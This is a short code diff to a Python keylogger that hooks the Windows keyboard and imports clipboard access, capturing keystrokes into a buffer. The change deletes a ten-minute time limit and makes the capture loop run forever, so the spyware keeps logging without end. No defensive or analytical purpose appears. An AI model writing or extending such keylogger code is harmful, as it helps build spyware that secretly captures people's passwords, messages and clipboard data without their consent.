@@ -11,8 +11,6 @@ import sys
 import time
 import win32clipboard
 
-TIMEOUT = 60*10
-
 #===========================#
 
 class KeyLogger:
@@ -78,11 +76,12 @@ def run():
         hm.KeyDown = kl.keystroke
         hm.HookKeyboard()
         
-        while time.thread_time() < TIMEOUT:
+        while True:
             pythoncom.PumpWaitingMessages()
             
         log = sys.stdout.getvalue()
         sys.stdout = save_stdout
+        
         return log
     
     except Exception as e:
